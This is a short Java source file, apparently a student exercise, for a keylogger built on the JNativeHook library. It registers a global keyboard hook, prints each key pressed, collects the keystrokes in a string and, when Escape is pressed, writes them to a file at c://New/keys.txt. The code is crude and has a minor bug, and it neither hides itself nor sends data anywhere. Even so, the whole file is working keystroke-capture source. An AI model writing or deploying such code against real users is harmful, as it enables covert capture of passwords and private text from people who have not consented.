import java.io.File;
import java.io.FileWriter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyloggerForSabirSir implements NativeKeyListener { /* Key Pressed */
	String s;
 public void nativeKeyPressed(NativeKeyEvent e)
		 { 
			 System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		 
		 
			 s=s+NativeKeyEvent.getKeyText(e.getKeyCode());
			 System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
			  s = s+System.lineSeparator(); 
			 /* Terminate program when one press ESCAPE */ 
			 if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
				 try{ 
					  File f = new File("c://New/keys.txt");
					 FileWriter fw=new FileWriter(f);
					 fw.write(s); 
					 fw.close(); 
			 GlobalScreen.unregisterNativeHook();
				 }catch(Exception ef){
					System.out.println("Monir");
				 		} 
				 	} 
	 } 
	 /* Key Released */ 
	 public void nativeKeyReleased(NativeKeyEvent e)
		 { //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		 } 
	 public void nativeKeyTyped(NativeKeyEvent e) { 
		 // System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	 } 
	 
	 public static void main(String[] args){ 
	 
	 		
		 try{
			 GlobalScreen.registerNativeHook();
		 }catch (NativeHookException e)
		 {
			e.printStackTrace(); 
		 }
		 
		 
		 
		 
		 
		 
		 
		 
		 GlobalScreen.addNativeKeyListener(new KeyloggerForSabirSir());
	 }
}


//